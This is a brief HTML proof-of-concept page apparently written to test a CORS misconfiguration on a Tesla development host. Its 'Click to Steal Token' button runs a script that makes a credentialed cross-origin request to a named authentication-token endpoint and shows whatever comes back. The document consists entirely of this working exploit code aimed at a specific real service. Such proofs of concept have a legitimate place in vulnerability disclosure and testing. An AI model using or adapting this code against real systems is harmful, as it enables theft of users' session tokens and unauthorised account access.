<!DOCTYPE html>
<html>
<head>
    <title>Tesla CORS PoC</title>
</head>
<body>
    <h2>Tesla Data Leakage Test</h2>
    <button onclick="exploit()">Click to Steal Token</button>
    <pre id="result" style="background: #eee; padding: 10px; margin-top: 10px;">Waiting for action...</pre>

    <script>
    function exploit() {
        const targetUrl = "https://garage-service-center.dev.teslamotors.com/api/v1/auth/token";
        document.getElementById('result').innerText = "Fetching data...";
        
        fetch(targetUrl, {
            method: 'GET',
            mode: 'cors',
            credentials: 'include'
        })
        .then(response => response.text())
        .then(data => {
            document.getElementById('result').innerText = data;
        })
        .catch(error => {
            document.getElementById('result').innerText = "Detailed Error: " + error.message;
        });
    }
    </script>
</body>
</html>
